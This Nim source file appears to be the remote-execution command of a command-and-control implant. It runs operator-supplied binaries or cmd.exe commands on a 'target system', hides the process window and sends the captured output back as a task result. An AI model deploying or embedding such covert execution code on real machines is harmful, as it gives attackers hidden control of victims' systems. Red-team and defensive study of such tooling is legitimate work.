import json

when defined(windows):
  import winim/lean
else:
  import osproc

type
  RunArgs = object
    executable: string
    arguments: string

proc run*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a binary on the target system
  try:
    let args = to(params, RunArgs)
    
    if args.executable.len == 0:
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "error",
        "user_output": "Executable path cannot be empty"
      }
    
    when defined(windows):
      var
        si: STARTUPINFOA
        pi: PROCESS_INFORMATION
        commandLine: string
      
      si.cb = sizeof(STARTUPINFOA).DWORD
      si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      # Build command line - handle "default" case for shell alias
      if args.executable == "default":
        # When called from shell command, arguments contains the actual command
        commandLine = "cmd.exe /c " & args.arguments
      elif args.arguments.len > 0:
        commandLine = args.executable & " " & args.arguments
      else:
        commandLine = args.executable
      
      # Create pipes for stdout/stderr
      var
        hStdoutRead, hStdoutWrite: HANDLE
        hStderrRead, hStderrWrite: HANDLE
        sa: SECURITY_ATTRIBUTES
      
      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = TRUE
      sa.lpSecurityDescriptor = nil
      
      if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": "Failed to create stdout pipe"
        }
      
      if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": "Failed to create stderr pipe"
        }
      
      # Make sure read handles are not inherited
      discard SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0)
      discard SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0)
      
      si.hStdOutput = hStdoutWrite
      si.hStdError = hStderrWrite
      si.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
      
      # Create process
      let createResult = CreateProcessA(
        nil,
        addr commandLine[0],
        nil,
        nil,
        TRUE,  # Inherit handles
        CREATE_NO_WINDOW,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      # Close write ends of pipes
      CloseHandle(hStdoutWrite)
      CloseHandle(hStderrWrite)
      
      if createResult == 0:
        let errorCode = GetLastError()
        CloseHandle(hStdoutRead)
        CloseHandle(hStderrRead)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": "Failed to create process. Error code: " & $errorCode
        }
      
      # Read output
      var output = ""
      var buffer: array[4096, char]
      var bytesRead: DWORD
      
      while ReadFile(hStdoutRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          output.add(buffer[i])
      
      # Read stderr
      var errors = ""
      while ReadFile(hStderrRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          errors.add(buffer[i])
      
      # Wait for process to complete
      discard WaitForSingleObject(pi.hProcess, INFINITE)
      
      var exitCode: DWORD
      discard GetExitCodeProcess(pi.hProcess, addr exitCode)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      CloseHandle(hStdoutRead)
      CloseHandle(hStderrRead)
      
      var finalOutput = ""
      if output.len > 0:
        finalOutput.add(output)
      if errors.len > 0:
        if finalOutput.len > 0:
          finalOutput.add("\n")
        finalOutput.add(errors)
      
      if finalOutput.len == 0:
        finalOutput = "(No output)"
      
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": if exitCode == 0: "success" else: "error",
        "user_output": finalOutput
      }
    else:
      # Unix-like systems
      var cmd = args.executable
      if args.arguments.len > 0:
        cmd &= " " & args.arguments
      
      let (output, exitCode) = execCmdEx(cmd)
      
      var finalOutput = "Process executed successfully\n"
      finalOutput.add("Command: " & cmd & "\n")
      finalOutput.add("Exit code: " & $exitCode & "\n")
      if output.len > 0:
        finalOutput.add("\n=== Output ===\n" & output & "\n==============\n")
      
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "success",
        "user_output": finalOutput
      }
      
  except Exception as e:
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "Failed to execute process: " & e.msg
    }
